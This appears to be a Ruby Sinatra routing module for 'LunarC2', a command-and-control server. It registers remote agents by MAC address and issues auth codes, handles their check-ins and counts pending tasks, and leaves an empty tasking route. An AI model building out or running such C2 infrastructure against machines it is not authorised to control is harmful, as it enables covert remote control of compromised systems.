module Sinatra
	module LunarC2
		module Routing
			module C2
				def self.registered(app) 

					app.post '/c2/initial' do
						@secret = ""
						if not @agent = Agent.first(mac: params[:mac])
							@secret = SecureRandom.uuid
							@agent = Agent.create(mac: params[:mac], 
											last_ip: params[:ip], 
											auth_code: @secret)
						end
						jbuilder :initial_json
					end	

					app.post '/c2/checkin/:id' do
						@agent = Agent.first(id: params[:id])
						if @agent.nil? or not @agent.authenticate(params[:auth_code])
							p @agent
							puts params

							@path = request.path_info
							jbuilder :error_json
						else
							@task_cnt = Task.count( open: true, agent: @agent )
							jbuilder :checkin_json
						end
					end

					app.get '/c2/tasking/:id' do

					end

				end
			end
		end
	end
end